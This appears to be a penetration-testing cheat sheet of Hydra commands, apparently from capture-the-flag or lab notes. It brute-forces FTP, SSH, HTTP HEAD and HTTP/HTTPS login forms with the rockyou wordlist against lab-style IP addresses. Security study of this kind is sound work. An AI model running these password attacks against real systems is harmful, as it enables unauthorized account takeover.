---
title: Hydra 🐍
---
## Hydra by ftp

````shell
hydra -l user -P passwords.txt ftp://<target-ip>
````

## Hydra for http form:

```shell
hydra -l fox -P /usr/share/wordlists/rockyou.txt -u -s 80 IP_HOST http-head

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```

## Brute force ssh:

- Use it when you can perform a redirection of the traffic to the ssh port but you have modified the configuration from the inside with socat

```shell
hydra -l USER -P /usr/share/wordlists/rockyou.txt ssh://IP_VICTIM:PORT
```

## Brute force login form:

```shell
hydra -L USERFILE -P PASSWORDFILE DOMAIN/IP METHOD "REDIRECTIONURL:PARAMETERS:FAILMESSAGE:H=COOKIES"
```

